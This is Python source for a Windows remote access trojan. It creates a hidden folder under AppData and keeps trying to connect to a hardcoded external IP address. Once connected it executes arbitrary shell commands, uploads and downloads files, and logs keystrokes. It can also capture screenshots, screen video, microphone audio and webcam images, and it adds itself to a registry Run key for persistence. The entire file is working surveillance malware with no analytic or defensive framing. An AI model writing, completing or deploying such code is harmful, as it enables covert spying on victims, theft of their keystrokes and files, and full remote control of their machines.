import os,threading,sys,shutil,subprocess as sp,socket as s,pyautogui as gui
import keylogger as key, platform as plat ,time as t
from ScreenRecorder import ScreenRecorder
from SoundReccording import Recording 
from DataHandling import DataHandling
from FileHandling import FileHandler
from WebCamHandler import WebCamHandler 

curr_dir,dir_name="","pr00ce$$"
platform = plat.system()
curr_dir = os.environ['appdata']


path = os.path.join(curr_dir,dir_name)
os.mkdir(path)
os.system("attrib +h {}".format(path))

soc = s.socket(s.AF_INET,s.SOCK_STREAM)

def control_shell():

    def persistant(reg_name,file_name):
        file_location = path+'\\'+file_name
        try:
            if not os.path.exists(file_location):
                shutil.copyfile(sys.executable,file_location)
                sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v'+reg_name+'/t REG_Z /d "'+file_location+'" ',
                shell=True)
                data_handler.data_send("[+] Presistent Created..{} ".format(reg_name))
            else:
                data_handler.data_send("[+] Presistent all ready created..{} ".format(reg_name))
        except:
            data_handler.data_send("[+] Error on Creating persistent")

    def screenshot_nebe():
        img = gui.screenshot()
        img.save(path+'\\'+'screenshot.png')
        file_handler.file_send(path+'\\'+'screenshot.png')
        os.remove(path+'\\'+'screenshot.png')

    def execution(command):
        execute = sp.Popen(command,shell=True,stdout = sp.PIPE,stdin=sp.PIPE,stderr=sp.PIPE)
        result = execute.stdout.read()+execute.stderr.read()
        result=result.decode()
        data_handler.data_send(result)
    
    data_handler=DataHandling(soc)
    file_handler=FileHandler(soc)
    
    while True:

        command = data_handler.data_recv()
        
        # exit from loop
        if command=='quit':
            break
        
        # passing help command
        elif command=='help':
            pass
        
        # passing clear command
        elif command=='clear':
            pass
        
        # getting current directory
        elif command == 'cd':
            data_handler.data_send(os.getcwd())
        
        # changing the directory
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
            data_handler.data_send(os.getcwd())
        
        # taking the screenshot of the device
        elif command[:10] == 'screenshot':
            screenshot_nebe()
        
        # downloading the file from server
        elif command[:7] == 'upload ':
            file_handler.file_recv(command[7:])
        
        # sending the file from system to server
        elif command[:9] == 'download ':
            file_handler.file_send(command[9:])
        
        # start the keylogger
        elif command[:15]=='keylogger_start':
            keylog=key.Keylogger(path=path)
            t = threading.Thread(target=keylog.start)
            t.start()
            data_handler.data_send("[*] Keylogger started...")
        
        # receving the key strocks
        elif command[:14]=='keylogger_dump':
            logs = keylog.read_file()
            data_handler.data_send(logs)
        
        # destroy the keylogger
        elif command[:14]=='keylogger_stop':
            keylog.self_destruct()
            data_handler.data_send("[+] Keylogger stoped..!")
            t.join()
            
        
        # starting the screen recorder
        elif command[:19] == 'screen_record_start':
            scrn_rec=ScreenRecorder(duration=command[19:],path=path,soc_obj=soc)
            t2=threading.Thread(target=scrn_rec.screen_capturing)
            t2.start()
            data_handler.data_send("[*] Screen Recorder started...")
        
        # terminating the screen recorder
        elif command == 'screen_record_stop':
            scrn_rec.stop_screen_recording()
            data_handler.data_send("[*] Screen Recorder stoped...")
            t2.join()
            

        # passing background command
        elif command == 'background':
            pass

        # creating persisteance in system..
        elif command[:11] =='persistance':
            reg_name,file_name = command[12:].split(' ')
            persistant(reg_name,file_name)
        
        # starting the audio record
        elif command[:18] == 'record_audio_start':
            record = Recording(time=command[19:],path=path)
            t3=threading.Thread(target=record.recording)
            data_handler.data_send("[*]... Recording started...")
            t3.start()
            
        
        # terminating the audio recording
        elif command == 'record_audio_stop':
            record.stop_recording()
            data_handler.data_send("[*]... Recording stoped...")
            t3.join()
            
        
        # starting the webcam capturing
        elif command[:13] == 'web_cam_start':
            webcam_record = WebCamHandler(soc_obj=soc,path=path)
            t4=threading.Thread(target=webcam_record.capture_webcam_image)
            data_handler.data_send("[*]... Webcam captering started...")
            t4.start()
            

        # terminating the webcam capturing
        elif command[:12] == 'web_cam_stop':
            webcam_record.stop_webcam_image()
            t4.join()
            

        # executing other commands
        else:
            execution(command)

            
def connection():
    while True:
        t.sleep(5)
        try:
            soc.connect(('103.154.234.176',1433))
            control_shell()
            soc.close()
            break
        except:
            continue

connection()